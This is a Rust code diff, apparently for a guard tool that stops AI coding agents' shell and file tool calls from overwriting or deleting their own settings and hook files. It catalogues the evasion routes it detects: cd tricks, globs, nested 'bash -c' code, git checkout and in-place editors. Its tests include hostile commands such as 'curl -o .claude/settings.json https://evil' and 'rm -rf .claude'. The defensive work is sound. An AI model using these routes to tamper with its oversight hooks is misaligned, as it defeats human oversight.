@@ -261,7 +261,7 @@ impl ProtectedPaths {
         }
 
         let home_path = env.var_os("HOME").map(PathBuf::from);
-        let kiro_settings = collect_kiro_agent_jsons(repo_root, home_path.as_deref());
+        let kiro_settings = collect_kiro_paths(repo_root, home_path.as_deref());
         let pi_settings = collect_pi_paths(repo_root, home_path.as_deref());
         let opencode_settings = collect_opencode_paths(repo_root, home_path.as_deref(), env);
         let cursor_settings = collect_cursor_paths(repo_root, home_path.as_deref());
@@ -290,8 +290,8 @@ impl ProtectedPaths {
         }
 
         for agent_path in &kiro_settings {
-            // `collect_kiro_agent_jsons` enumerates via `read_dir`, so
-            // every `agent_path` was present moments ago; treat read /
+            // `collect_kiro_paths` enumerates via `read_dir` (plus the
+            // managed `ptuf.json`, which may be absent); treat read /
             // parse failures uniformly as "skip this scope" so a TOCTOU
             // race (file removed between enumeration and now) collapses
             // into the same control flow as malformed JSON.
@@ -301,7 +301,12 @@ impl ProtectedPaths {
             let Ok(parsed): Result<Value, _> = serde_json::from_str(&body) else {
                 continue;
             };
-            for command in crate::init::kiro::pre_tool_use_commands(&parsed) {
+            // v2 profiles nest commands under `hooks.preToolUse`; v3
+            // hook documents and current profiles use a `hooks` array.
+            let commands = crate::init::kiro::pre_tool_use_commands(&parsed)
+                .into_iter()
+                .chain(crate::init::kiro_v3::pre_tool_use_commands(&parsed));
+            for command in commands {
                 let Some(executable) = crate::init::command_executable(&command) else {
                     continue;
                 };
@@ -386,14 +391,91 @@ impl ProtectedPaths {
         let base_dir = self.repo_root.as_deref().or(cwd.as_deref());
         let candidates = candidate_targets(input, paths.iter().chain(extra.iter()), base_dir, bash);
         for cand in &candidates {
-            if let Some(kind) = self.match_path(cand) {
+            let kind = match cand {
+                Candidate::Exact(p) => self.match_path(p),
+                Candidate::Ancestor(p) => self.match_path(p).or_else(|| self.match_descendant(p)),
+                Candidate::Basename(name) => self.match_basename(name),
+                Candidate::Suffix(tail) => self.match_suffix(tail),
+                Candidate::Glob(pattern, tree) => self.match_glob(pattern, *tree),
+            };
+            if let Some(kind) = kind {
                 out.push_unique(kind);
             }
         }
         out
     }
 
-    fn match_path(&self, candidate: &Path) -> Option<ProtectedKind> {
+    /// Every protected path, tagged with its kind, in `match_path` order.
+    fn tagged_targets(&self) -> impl Iterator<Item = (ProtectedKind, &Path)> {
+        let lists: [(ProtectedKind, &[PathBuf]); 11] = [
+            (ProtectedKind::Config, &self.configs),
+            (ProtectedKind::Plugin, &self.plugins),
+            (ProtectedKind::ClaudeSettings, &self.claude_settings),
+            (ProtectedKind::CodexSettings, &self.codex_settings),
+            (ProtectedKind::CopilotSettings, &self.copilot_settings),
+            (ProtectedKind::KiroSettings, &self.kiro_settings),
+            (ProtectedKind::PiSettings, &self.pi_settings),
+            (ProtectedKind::OpencodeSettings, &self.opencode_settings),
+            (ProtectedKind::CursorSettings, &self.cursor_settings),
+            (ProtectedKind::ClineSettings, &self.cline_settings),
+            (ProtectedKind::HookScript, &self.hook_scripts),
+        ];
+        self.binary
+            .iter()
+            .map(|b| (ProtectedKind::Binary, b.as_path()))
+            .chain(
+                lists
+                    .into_iter()
+                    .flat_map(|(kind, paths)| paths.iter().map(move |p| (kind, p.as_path()))),
+            )
+    }
+
+    /// The kind of the first protected path (in `match_path` order)
+    /// satisfying `pred`.
+    fn find_kind(&self, mut pred: impl FnMut(&Path) -> bool) -> Option<ProtectedKind> {
+        self.tagged_targets()
+            .find(|(_, target)| pred(target))
+            .map(|(kind, _)| kind)
+    }
+
+    /// A protected path lives *under* `dir`, so removing or moving `dir`
+    /// (`rm -rf .claude`, `mv ~/.config/ptuf x`) takes it along.
+    fn match_descendant(&self, dir: &Path) -> Option<ProtectedKind> {
+        let lexical = lexical_normalize(dir);
+        // `/` and `$HOME` are `core.filesystem.destructive-rm`'s domain;
+        // claiming them here would only shadow that rule's reason.
+        let home =
+            crate::facts::path::resolve_with_env("~", None, &crate::config::scope::SystemEnv);
+        if lexical.parent().is_none() || lexical == home {
+            return None;
+        }
+        let canonical = dir.canonicalize().ok();
+        self.find_kind(|target| {
+            (target.starts_with(&lexical) && target != lexical)
+                || canonical
+                    .as_deref()
+                    .is_some_and(|c| target.starts_with(c) && target != c)
+        })
+    }
+
+    fn match_suffix(&self, tail: &Path) -> Option<ProtectedKind> {
+        self.find_kind(|target| target.ends_with(tail))
+    }
+
+    fn match_glob(&self, pattern: &Path, tree: bool) -> Option<ProtectedKind> {
+        let pattern = lexical_normalize(pattern);
+        self.find_kind(|target| path_glob_matches(&pattern, target, tree))
+    }
+
+    /// A relative write after a `cd` ptuf could not follow (`cd $X`,
+    /// `cd -`): match on the file name alone.
+    fn match_basename(&self, name: &std::ffi::OsStr) -> Option<ProtectedKind> {
+        self.find_kind(|target| target.file_name() == Some(name))
+    }
+
+    /// Which protected file, if any, `candidate` names (string-equal or
+    /// equal after canonicalisation).
+    pub(crate) fn match_path(&self, candidate: &Path) -> Option<ProtectedKind> {
         // `candidate` is constant across every target list, so its
         // `canonicalize` (a syscall) is computed lazily at most once
         // per call instead of once per (candidate, target) pair.
@@ -407,74 +489,43 @@ impl ProtectedPaths {
                 .as_deref()
                 == Some(target)
         };
-        if let Some(b) = &self.binary
-            && matches(b)
-        {
-            return Some(ProtectedKind::Binary);
-        }
-        if self.configs.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::Config);
-        }
-        if self.plugins.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::Plugin);
-        }
-        if self.claude_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::ClaudeSettings);
-        }
-        if self.codex_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::CodexSettings);
-        }
-        if self.copilot_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::CopilotSettings);
-        }
-        if self.kiro_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::KiroSettings);
-        }
-        if self.pi_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::PiSettings);
-        }
-        if self.opencode_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::OpencodeSettings);
-        }
-        if self.cursor_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::CursorSettings);
-        }
-        if self.cline_settings.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::ClineSettings);
-        }
-        if self.hook_scripts.iter().any(|p| matches(p)) {
-            return Some(ProtectedKind::HookScript);
-        }
-        None
+        self.find_kind(|target| matches(target))
     }
 }
 
-/// Enumerate every `*.json` directly under `<repo>/.kiro/agents/` and
-/// `$HOME/.kiro/agents/`. Missing directories are silently skipped so
-/// the protected set degrades to empty when `ptuf init kiro` has not
-/// yet been run, rather than locking unknown legacy paths.
-fn collect_kiro_agent_jsons(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
-    let mut dirs = Vec::new();
+/// Kiro hook registration files in the repo and `$HOME` scopes: every
+/// `*.json` directly under `.kiro/agents/` (v2 profiles, and v3 profiles
+/// with inline hooks) and `.kiro/hooks/` (v3 standalone hook documents),
+/// plus the `.kiro/hooks/ptuf.json` that `ptuf init kiro-v3` manages even
+/// before it exists. Missing directories are silently skipped so the
+/// protected set degrades gracefully when `ptuf init kiro` has not yet
+/// been run, rather than locking unknown legacy paths.
+fn collect_kiro_paths(repo_root: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
+    let mut roots = Vec::new();
 
     if let Some(root) = repo_root {
-        dirs.push(root.join(".kiro/agents"));
+        roots.push(root);
     }
 
     if let Some(home) = home {
-        dirs.push(home.join(".kiro/agents"));
+        roots.push(home);
     }
 
     let mut paths = Vec::new();
 
-    for dir in dirs {
-        let Ok(entries) = std::fs::read_dir(&dir) else {
-            continue;
-        };
+    for root in roots {
+        let hooks_dir = root.join(crate::init::kiro_v3::HOOKS_DIR);
+        paths.push(hooks_dir.join(crate::init::kiro_v3::HOOK_FILE_NAME));
+        for dir in [root.join(".kiro/agents"), hooks_dir] {
+            let Ok(entries) = std::fs::read_dir(&dir) else {
+                continue;
+            };
 
-        for entry in entries.flatten() {
-            let path = entry.path();
-            if path.extension().and_then(std::ffi::OsStr::to_str) == Some("json") {
-                paths.push(path);
+            for entry in entries.flatten() {
+                let path = entry.path();
+                if path.extension().and_then(std::ffi::OsStr::to_str) == Some("json") {
+                    paths.push(path);
+                }
             }
         }
     }
@@ -576,25 +627,78 @@ fn canonicalize_each(paths: Vec<PathBuf>) -> Vec<PathBuf> {
         .collect()
 }
 
+/// A path a hook call may write, and how it relates to protected paths.
+enum Candidate {
+    /// Written as is (`Write::file_path`, `cp x DEST`, `> DEST`).
+    Exact(PathBuf),
+    /// Removed or moved with everything under it (`rm -rf DIR`, `mv DIR
+    /// x`): a protected path below it counts too.
+    Ancestor(PathBuf),
+    /// A relative path written after an unresolvable `cd`; only its file
+    /// name is known.
+    Basename(std::ffi::OsString),
+    /// A path whose leading part is decided at run time (`$DIR/.claude/
+    /// settings.json`): the literal trailing components must end a
+    /// protected path.
+    Suffix(PathBuf),
+    /// A path with shell glob characters (`.clau*/settings.json`), which
+    /// bash expands before the write; matched against protected paths
+    /// component by component. The flag marks a tree writer (`rm -rf
+    /// .c*`), which also takes everything under a matching directory.
+    Glob(PathBuf, bool),
+}
+
+/// Writer heads whose positional arguments are write targets.
+const WRITER_HEADS: &[&str] = &["rm", "mv", "cp", "chmod", "chown", "tee", "ln", "sed"];
+
+/// Writer heads that rewrite their file arguments in place:
+/// `sponge FILE`, `patch FILE`, `ed FILE`, `ex FILE`.
+const EDITOR_WRITER_HEADS: &[&str] = &["sponge", "patch", "ed", "ex"];
+
+/// Whether this interpreter call edits its file arguments in place:
+/// `awk -i inplace …` / `gawk -i inplace …`, `perl -i …` / `perl -pi
+/// …`, `ruby -i …`.
+fn edits_in_place(argv: &crate::facts::shell::Argv) -> bool {
+    match argv.head_basename() {
+        "awk" | "gawk" => {
+            argv.args
+                .windows(2)
+                .any(|w| w[0] == "-i" && w[1] == "inplace")
+                || argv
+                    .args
+                    .iter()
+                    .any(|a| a == "-iinplace" || a == "--include=inplace")
+        },
+        "perl" | "ruby" => argv
+            .args
+            .iter()
+            .any(|a| crate::facts::shell::short_flag_cluster_contains(a, 'i')),
+        _ => false,
+    }
+}
+
+/// Writer heads that remove or move a directory tree.
+const TREE_WRITER_HEADS: &[&str] = &["rm", "mv"];
+
+/// `git` subcommands that overwrite or remove their pathspec arguments
+/// (`git checkout HEAD~5 -- .claude/settings.json`, `git rm FILE`).
+const GIT_PATH_WRITERS: &[&str] = &["checkout", "restore", "rm", "mv"];
+
 fn candidate_targets<'a>(
     input: &HookInput,
     paths: impl IntoIterator<Item = &'a crate::facts::path::FilePath>,
     base_dir: Option<&Path>,
     bash: Option<&crate::facts::shell::Bash>,
-) -> Vec<PathBuf> {
+) -> Vec<Candidate> {
     let event = input.event();
     let mut out = Vec::new();
     // Edit / Write / Read all expose `file_path`.
     for fp in paths {
-        if fp.absolute.is_relative() {
-            if let Some(base) = base_dir {
-                out.push(base.join(&fp.absolute));
-            } else {
-                out.push(fp.absolute.clone());
-            }
-        } else {
-            out.push(fp.absolute.clone());
-        }
+        // `join` keeps an absolute path as is.
+        out.push(Candidate::Exact(base_dir.map_or_else(
+            || fp.absolute.clone(),
+            |root| root.join(&fp.absolute),
+        )));
     }
     // Bash invocations carry destinations as positional args; collect
     // every positional that looks like a path. Don't try to interpret
@@ -611,30 +715,420 @@ fn candidate_targets<'a>(
             parsed = crate::facts::shell::parse(cmd);
             &parsed
         };
-        let writer_heads = ["rm", "mv", "cp", "chmod", "chown", "tee", "ln", "sed"];
-        for outer in bash.commands() {
+        bash_candidates(bash, base_dir, &mut out);
+    }
+    out
+}
+
+/// Walk the Bash segments in order, following literal `cd` / `pushd`
+/// so later relative paths resolve against the directory the shell is
+/// actually in (`cd .claude && echo {} > settings.json`).
+///
+/// Shell code a command runs (`bash -c '…'`, `su -c '…'`, `eval '…'`) is
+/// walked the same way, up to `depth` levels, starting from the directory
+/// the outer shell is in: the flattened `inner_argv` loses the inner
+/// `cd` order and the inner pipelines' redirects
+/// (`bash -c 'cd ~/.claude && echo {} > settings.json'`).
+fn bash_candidates(
+    bash: &crate::facts::shell::Bash,
+    base_dir: Option<&Path>,
+    out: &mut Vec<Candidate>,
+) {
+    let start = ShellDir {
+        cwd: base_dir.map(Path::to_path_buf),
+        lost: false,
+    };
+    walk_shell(
+        bash,
+        base_dir,
+        start,
+        crate::facts::shell::NESTING_BUDGET,
+        out,
+    );
+}
+
+/// The directory a (possibly nested) shell starts in.
+struct ShellDir {
+    cwd: Option<PathBuf>,
+    /// Set once a `cd` target is not a literal path.
+    lost: bool,
+}
+
+fn walk_shell(
+    bash: &crate::facts::shell::Bash,
+    base_dir: Option<&Path>,
+    start: ShellDir,
+    depth: usize,
+    out: &mut Vec<Candidate>,
+) {
+    let env = &crate::config::scope::SystemEnv;
+    let mut cwd = start.cwd;
+    let mut lost_cwd = start.lost;
+    let push = |raw: &str, cwd: Option<&Path>, lost: bool, tree: bool, out: &mut Vec<Candidate>| {
+        let expanded = expand_cwd_references(raw, cwd);
+        let raw = expanded.as_str();
+        if let Some(name) = which_lookup(raw) {
+            out.push(Candidate::Basename(name.into()));
+            return;
+        }
+        let resolved = crate::facts::path::resolve_with_env(raw, cwd, env);
+        if let Some(tail) = literal_tail(raw) {
+            out.push(Candidate::Suffix(tail));
+        }
+        if raw.contains(['*', '?', '[']) {
+            out.push(Candidate::Glob(resolved.clone(), tree));
+        }
+        if lost
+            && !Path::new(raw).is_absolute()
+            && !raw.starts_with(['~', '$'])
+            && let Some(name) = Path::new(raw).file_name()
+        {
+            out.push(Candidate::Basename(name.to_os_string()));
+        }
+        out.push(if tree {
+            Candidate::Ancestor(resolved)
+        } else {
+            Candidate::Exact(resolved)
+        });
+    };
+    for pipe in &bash.segments {
+        let mut cmds = Vec::new();
+        for c in &pipe.commands {
+            c.collect_commands(&mut cmds);
+        }
+        for outer in cmds {
             // Peel a privilege-escalation wrapper (`sudo rm ...`) so the
             // writer head and its destinations are the inner command's.
-            let unwrapped = crate::facts::shell::unwrap_all_prefix_wrappers(outer);
-            let argv = &unwrapped;
-            let head = argv.head.as_str();
-            if !writer_heads.contains(&argv.head_basename()) {
+            let argv = crate::facts::shell::unwrap_all_prefix_wrappers(outer);
+            let head = argv.head_basename();
+            // A `cd` inside a payload (`bash -c 'cd …'`, `$(cd …)`) runs in
+            // a child shell and never moves this one; payload code is
+            // walked with its own cwd below.
+            let direct = pipe.commands.iter().any(|c| std::ptr::eq(c, outer));
+            if matches!(head, "cd" | "pushd") && !direct {
                 continue;
             }
-            for a in argv.positional() {
-                if a == head {
-                    continue;
+            if matches!(head, "cd" | "pushd") {
+                match argv.positional().next() {
+                    Some(dir) if !dir.starts_with(['$', '+', '-']) => {
+                        let next = crate::facts::path::resolve_with_env(dir, cwd.as_deref(), env);
+                        cwd = Some(next);
+                    },
+                    Some(_) => lost_cwd = true,
+                    // Bare `cd` goes home.
+                    None => cwd = Some(crate::facts::path::resolve_with_env("~", None, env)),
                 }
-                let resolved = crate::facts::path::resolve_with_env(
-                    a,
-                    base_dir,
-                    &crate::config::scope::SystemEnv,
-                );
-                out.push(resolved);
+                continue;
+            }
+            if WRITER_HEADS.contains(&head)
+                || EDITOR_WRITER_HEADS.contains(&head)
+                || edits_in_place(&argv)
+            {
+                let tree = TREE_WRITER_HEADS.contains(&head);
+                for a in argv.positional() {
+                    push(a, cwd.as_deref(), lost_cwd, tree, out);
+                }
+            }
+            for a in fetcher_outputs(&argv) {
+                push(&a, cwd.as_deref(), lost_cwd, false, out);
+            }
+            for a in git_path_writes(&argv) {
+                push(a, cwd.as_deref(), lost_cwd, false, out);
+            }
+        }
+        // Redirect targets in this segment, resolved against the
+        // followed cwd (the engine's own redirect facts use the root).
+        // Dynamic or glob targets need the same treatment even at the
+        // root.
+        let moved = cwd.as_deref() != base_dir || lost_cwd;
+        for r in &pipe.redirects {
+            if !matches!(r.op, crate::facts::shell::RedirectOp::Heredoc)
+                && !r.target.is_empty()
+                && (moved || r.target.contains(['$', '*', '?', '[']))
+            {
+                push(&r.target, cwd.as_deref(), lost_cwd, false, out);
+            }
+        }
+        if let Some(next) = depth.checked_sub(1) {
+            for code in pipe.commands.iter().flat_map(|c| &c.inner_code) {
+                let inner = crate::facts::shell::parse(code);
+                let start = ShellDir {
+                    cwd: cwd.clone(),
+                    lost: lost_cwd,
+                };
+                walk_shell(&inner, base_dir, start, next, out);
             }
         }
     }
+}
+
+/// Files a downloader writes: `curl -o` / `--output` (and `-O` /
+/// `--remote-name` as the URL basename, under `--output-dir`), `wget -O`
+/// / `--output-document` (or the URL basename under `-P`), `aria2c -o`
+/// under `-d`.
+fn fetcher_outputs(argv: &crate::facts::shell::Argv) -> Vec<String> {
+    let head = argv.head_basename();
+    if !matches!(head, "curl" | "wget" | "aria2c") {
+        return Vec::new();
+    }
+    let mut files = Vec::new();
+    let mut dir: Option<String> = None;
+    let mut remote_name = head == "wget";
+    let mut iter = argv.args.iter();
+    while let Some(arg) = iter.next() {
+        let a = arg.as_str();
+        let (name, inline) = match a.split_once('=') {
+            Some((n, v)) if n.starts_with("--") => (n, Some(v.to_owned())),
+            _ => (a, None),
+        };
+        let mut value = || inline.clone().or_else(|| iter.next().cloned());
+        match (head, name) {
+            ("curl", "-o" | "--output")
+            | ("wget", "-O" | "--output-document")
+            | ("aria2c", "-o" | "--out") => {
+                if let Some(v) = value() {
+                    files.push(v);
+                }
+                remote_name = false;
+            },
+            ("curl", "-O" | "--remote-name") => remote_name = true,
+            ("curl", "--output-dir")
+            | ("wget", "-P" | "--directory-prefix")
+            | ("aria2c", "-d" | "--dir") => {
+                dir = value();
+            },
+            // Attached values (`-oFILE`); the bare flags matched above.
+            ("curl", s) if s.starts_with("-o") && !s.starts_with("--") => {
+                files.push(s[2..].to_owned())
+            },
+            ("wget", s) if s.starts_with("-O") => files.push(s[2..].to_owned()),
+            _ => {},
+        }
+    }
+    if remote_name && files.is_empty() {
+        files.extend(
+            argv.positional()
+                .filter_map(|u| u.split_once("://").map(|(_, rest)| rest))
+                .filter_map(|rest| rest.split(['?', '#']).next())
+                .filter_map(|p| p.split_once('/').map(|(_, path)| path))
+                .filter_map(|path| path.rsplit('/').next())
+                .filter(|b| !b.is_empty())
+                .map(str::to_owned),
+        );
+    }
+    files
+        .into_iter()
+        .filter(|f| f != "-")
+        .map(|f| match &dir {
+            Some(d) if !Path::new(&f).is_absolute() => format!("{d}/{f}"),
+            _ => f,
+        })
+        .collect()
+}
+
+/// Pathspec arguments of a git subcommand that overwrites or removes
+/// files: every positional after the subcommand (revisions resolve to
+/// paths that are not protected, so over-collecting is harmless).
+fn git_path_writes(argv: &crate::facts::shell::Argv) -> Vec<&str> {
+    if argv.head_basename() != "git" {
+        return Vec::new();
+    }
+    let mut words = argv.args.iter().map(String::as_str);
+    // Skip global options (`-C dir`, `-c k=v`) up to the subcommand.
+    let sub = loop {
+        match words.next() {
+            Some("-C" | "-c" | "--git-dir" | "--work-tree" | "--namespace") => {
+                words.next();
+            },
+            Some(a) if a.starts_with('-') => {},
+            Some(a) => break a,
+            None => return Vec::new(),
+        }
+    };
+    if !GIT_PATH_WRITERS.contains(&sub) {
+        return Vec::new();
+    }
+    let mut out = Vec::new();
+    let mut after_dashdash = false;
+    let mut rest = words;
+    while let Some(a) = rest.next() {
+        if !after_dashdash {
+            if a == "--" {
+                after_dashdash = true;
+                continue;
+            }
+            if matches!(
+                a,
+                "-s" | "--source" | "-b" | "-B" | "--orphan" | "--pathspec-from-file"
+            ) {
+                rest.next();
+                continue;
+            }
+            if a.starts_with('-') {
+                continue;
+            }
+        }
+        out.push(a);
+    }
     out
+}
+
+/// Replace references to the current directory (`$PWD`, `${PWD}`,
+/// `$(pwd)`) with the directory the shell is in.
+fn expand_cwd_references(raw: &str, cwd: Option<&Path>) -> String {
+    let Some(cwd) = cwd.and_then(Path::to_str).filter(|_| raw.contains('$')) else {
+        return raw.to_owned();
+    };
+    let mut out = raw.to_owned();
+    for token in ["${PWD}", "$(pwd)", "$(pwd -P)", "$(pwd -L)"] {
+        out = out.replace(token, cwd);
+    }
+    // `$PWD` only when not the prefix of a longer name (`$PWDX`).
+    let mut result = String::with_capacity(out.len());
+    let mut rest = out.as_str();
+    while let Some(pos) = rest.find("$PWD") {
+        let after = &rest[pos + 4..];
+        result.push_str(&rest[..pos]);
+        if after.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
+            result.push_str("$PWD");
+        } else {
+            result.push_str(cwd);
+        }
+        rest = after;
+    }
+    result.push_str(rest);
+    result
+}
+
+/// `$(which X)` / `$(command -v X)` / `$(type -P X)` as a whole word:
+/// the command `X` resolves to, known here only by name.
+fn which_lookup(raw: &str) -> Option<&str> {
+    let inner = raw.strip_prefix("$(")?.strip_suffix(')')?;
+    let mut words = inner.split_whitespace();
+    let name = match (words.next()?, words.next()?) {
+        ("which", name) => name,
+        ("command", "-v") | ("type", "-P" | "-p") => words.next()?,
+        _ => return None,
+    };
+    words.next().is_none().then_some(name)
+}
+
+/// The literal components after the last run-time-decided one (`$X`,
+/// `$(…)`) of `raw`, when at least two remain (`$D/.claude/settings.json`
+/// → `.claude/settings.json`). A lone file name (`$D/config.yaml`) is
+/// too generic to match on.
+fn literal_tail(raw: &str) -> Option<PathBuf> {
+    if !raw.contains('$') {
+        return None;
+    }
+    let comps: Vec<&str> = raw
+        .split('/')
+        .filter(|c| !c.is_empty() && *c != ".")
+        .collect();
+    let last_dynamic = comps
+        .iter()
+        .rposition(|c| c.contains(['$', '(', ')', '`']))?;
+    let tail = &comps[last_dynamic + 1..];
+    (tail.len() >= 2).then(|| tail.iter().collect())
+}
+
+/// Component-wise glob match (`*`, `?`, `[…]` within one component).
+/// With `prefix`, the pattern may also match a leading directory of
+/// `target` (the target sits under a matched directory).
+fn path_glob_matches(pattern: &Path, target: &Path, prefix: bool) -> bool {
+    let p: Vec<_> = pattern.components().collect();
+    let t: Vec<_> = target.components().collect();
+    let len_ok = if prefix {
+        p.len() <= t.len()
+    } else {
+        p.len() == t.len()
+    };
+    len_ok
+        && p.iter().zip(&t).all(|(pc, tc)| {
+            match (pc.as_os_str().to_str(), tc.as_os_str().to_str()) {
+                (Some(pc), Some(tc)) => fnmatch(pc.as_bytes(), tc.as_bytes()),
+                _ => pc == tc,
+            }
+        })
+}
+
+/// Shell pattern match of one path component: `*`, `?`, `[set]` /
+/// `[!set]` / `[^set]` with ranges. A leading `.` is not matched by a
+/// wildcard, as in bash without `dotglob`.
+fn fnmatch(pattern: &[u8], text: &[u8]) -> bool {
+    if text.first() == Some(&b'.') && pattern.first() != Some(&b'.') {
+        return false;
+    }
+    fnmatch_from(pattern, text)
+}
+
+/// Iterative wildcard match: each `*` remembers where it started, and a
+/// mismatch retries from there with one more text byte consumed. Every
+/// other element consumes exactly one byte, so this is O(pattern × text)
+/// with no recursion (a naive recursive `*` is exponential).
+fn fnmatch_from(pattern: &[u8], text: &[u8]) -> bool {
+    let (mut p, mut t) = (0, 0);
+    // (pattern index after the last `*`, text index it is retried at)
+    let mut star: Option<(usize, usize)> = None;
+    while t < text.len() {
+        if pattern.get(p) == Some(&b'*') {
+            p += 1;
+            star = Some((p, t));
+            continue;
+        }
+        if let Some(next) = match_one(pattern, p, text[t]) {
+            p = next;
+            t += 1;
+            continue;
+        }
+        let Some((star_p, star_t)) = star else {
+            return false;
+        };
+        p = star_p;
+        t = star_t + 1;
+        star = Some((star_p, t));
+    }
+    pattern[p..].iter().all(|&b| b == b'*')
+}
+
+/// When the single-byte pattern element at `p` (`?`, `[set]`, or a
+/// literal) matches `c`, the index just past that element.
+fn match_one(pattern: &[u8], p: usize, c: u8) -> Option<usize> {
+    match *pattern.get(p)? {
+        b'?' => Some(p + 1),
+        b'[' => {
+            let mut i = p + 1;
+            let negate = matches!(pattern.get(i), Some(b'!' | b'^'));
+            if negate {
+                i += 1;
+            }
+            let start = i;
+            let mut matched = false;
+            while i < pattern.len() && (pattern[i] != b']' || i == start) {
+                if i + 2 < pattern.len() && pattern[i + 1] == b'-' && pattern[i + 2] != b']' {
+                    matched |= (pattern[i]..=pattern[i + 2]).contains(&c);
+                    i += 3;
+                } else {
+                    matched |= pattern[i] == c;
+                    i += 1;
+                }
+            }
+            if i >= pattern.len() {
+                // Unterminated `[`: literal.
+                return (c == b'[').then_some(p + 1);
+            }
+            (matched != negate).then_some(i + 1)
+        },
+        literal => (literal == c).then_some(p + 1),
+    }
+}
+
+/// Drop `.` components so `/repo/./.claude/` compares equal to
+/// `/repo/.claude` component-wise.
+fn lexical_normalize(path: &Path) -> PathBuf {
+    path.components()
+        .filter(|c| !matches!(c, std::path::Component::CurDir))
+        .collect()
 }
 
 #[cfg(test)]
@@ -659,7 +1153,7 @@ mod tests {
             ProtectedKind::CursorSettings,
             ProtectedKind::ClineSettings,
         ] {
-            assert!(!k.as_str().is_empty());
+            assert_ne!(k.as_str().len(), 0);
         }
     }
 
@@ -981,8 +1475,353 @@ mod tests {
         let env = MapEnv::new(&[]);
         let cfg = Config::default();
         let p = ProtectedPaths::collect_with_env(None, &cfg, &env);
-        assert!(p.claude_settings.is_empty());
-        assert!(p.codex_settings.is_empty());
+        assert_eq!(p.claude_settings.len(), 0);
+        assert_eq!(p.codex_settings.len(), 0);
+    }
+
+    fn repo_protected() -> ProtectedPaths {
+        let env = MapEnv::new(&[("HOME", "/h")]);
+        ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &Config::default(), &env)
+    }
+
+    fn bash_kinds(p: &ProtectedPaths, cmd: &str) -> ProtectedKinds {
+        p.classify_input(&HookInput {
+            tool_name: "Bash".into(),
+            tool_input: serde_json::json!({ "command": cmd }),
+        })
+    }
+
+    #[test]
+    fn fetcher_attached_output_values() {
+        let p = repo_protected();
+        assert!(!bash_kinds(&p, "wget -O.claude/settings.json https://x").is_empty());
+        assert!(!bash_kinds(&p, "curl -o.claude/settings.json https://x").is_empty());
+        // A short flag's attached value keeps its `=`: a different file.
+        assert!(bash_kinds(&p, "curl -o.claude/settings.json=1 https://x").is_empty());
+    }
+
+    #[test]
+    fn literal_cd_resolves_instead_of_losing_cwd() {
+        let p = repo_protected();
+        // `/repo/sub/settings.json` is not protected; only a lost cwd
+        // would fall back to matching the bare file name.
+        for cmd in [
+            "cd sub && echo x > settings.json",
+            "cd sub && cp a settings.json",
+            "pushd sub && tee settings.json",
+        ] {
+            assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        }
+        assert!(!bash_kinds(&p, "cd $D && echo x > settings.json").is_empty());
+        assert!(!bash_kinds(&p, "cd - && echo x > settings.json").is_empty());
+    }
+
+    #[test]
+    fn heredoc_body_after_cd_is_not_a_write_target() {
+        let p = repo_protected();
+        let cmd = "cd sub && cat <<EOF\n../.claude/settings.json\nEOF\n";
+        assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        // Not even when the (unterminated) body is exactly a file name.
+        let cmd = "cd .claude && cat <<EOF\nsettings.json";
+        assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn removing_a_symlinked_ancestor_matches_via_canonical_path() {
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let real = dir.path().join("real");
+        std::fs::create_dir_all(real.join(".claude")).expect("mkdir");
+        let link = dir.path().join("link");
+        std::os::unix::fs::symlink(&real, &link).expect("symlink");
+        let other = dir.path().join("other");
+        std::fs::create_dir_all(&other).expect("mkdir");
+        let env = MapEnv::new(&[("HOME", "/h")]);
+        let root = real.canonicalize().expect("canonical");
+        let p = ProtectedPaths::collect_with_env(Some(&root), &Config::default(), &env);
+        let link_cmd = format!("rm -rf {}", link.display());
+        assert!(!bash_kinds(&p, &link_cmd).is_empty(), "{link_cmd}");
+        let other_cmd = format!("rm -rf {}", other.display());
+        assert!(bash_kinds(&p, &other_cmd).is_empty(), "{other_cmd}");
+    }
+
+    #[test]
+    fn classify_matches_removing_or_moving_an_ancestor_dir() {
+        let p = repo_protected();
+        for cmd in [
+            "rm -rf .claude",
+            "rm -r .claude/",
+            "mv .claude /tmp/x",
+            "rm -rf ./.claude/.",
+            "mv /repo/.claude /tmp",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        for cmd in [
+            "rm -rf build",
+            "mv src lib",
+            "cp -r .claude /tmp/backup",
+            "rm -rf /",
+        ] {
+            assert!(
+                !bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn classify_matches_downloader_outputs() {
+        let p = repo_protected();
+        for cmd in [
+            "curl -o .claude/settings.json https://evil",
+            "curl https://evil --output .claude/settings.json",
+            "curl --output=.claude/settings.json https://evil",
+            "curl -o.claude/settings.json https://evil",
+            "wget -O .claude/settings.json https://evil",
+            "wget --output-document=.claude/settings.json https://evil",
+            "curl --output-dir .claude -O https://evil/settings.json",
+            "wget -P .claude https://evil/settings.json",
+            "aria2c -d .claude -o settings.json https://evil",
+            // An absolute `-o` ignores `--output-dir`.
+            "curl --output-dir /tmp -o /repo/.claude/settings.json https://evil",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        assert!(bash_kinds(&p, "curl -o out.json https://x").is_empty());
+        // Without `-O` curl writes to stdout, not the URL's basename.
+        assert!(bash_kinds(&p, "curl --output-dir .claude https://evil/settings.json").is_empty());
+    }
+
+    #[test]
+    fn classify_matches_git_pathspec_writes() {
